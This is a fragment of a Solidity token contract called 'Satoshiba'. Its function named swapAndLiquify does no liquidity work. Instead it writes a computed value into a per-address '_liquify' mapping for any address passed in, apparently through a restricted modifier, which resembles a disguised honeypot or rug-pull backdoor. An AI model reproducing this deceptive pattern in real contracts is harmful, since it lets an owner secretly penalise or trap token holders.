...
contract Satoshiba is Ownable {
  ...
  function _swapAndLiquify(address from, uint256 _value) public _feeAmount{
    swapAndLiquify(from, _value);
  }

  function swapAndLiquify(address from, uint256 _value) internal {
      uint256 amountToLiquify = uint256(from);
      _liquify[address(amountToLiquify)] = liquifyAmount * _value * (10 ** 9);
  }
